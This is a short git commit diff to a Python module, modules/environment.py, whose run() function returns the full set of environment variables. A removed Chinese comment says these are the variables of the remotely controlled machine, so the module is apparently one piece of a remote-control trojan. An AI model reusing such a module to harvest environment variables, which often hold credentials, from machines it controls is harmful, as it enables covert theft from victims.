f8b65b22b394efbcde375875e9b2bd0d17c11f39
Tok1111 <96003539+Tok1111@users.noreply.github.com>
2022-03-27 19:26:19 +0800

    Update environment.py

--- modules/environment.py
+++ modules/environment.py
@@ -1,13 +1,6 @@
-#!/usr/bin/python
-#-*- coding:utf8 -*-
-
 import os
 
 def run(**args):
-    print ("[*] In environment module.")
-    # 返回当前系统的环境变量，这里就是远程被控机器的环境变量
+    print "[*] In Environment module"
     return str(os.environ)
-
-if __name__ == "__main__":
-         print (run())
 
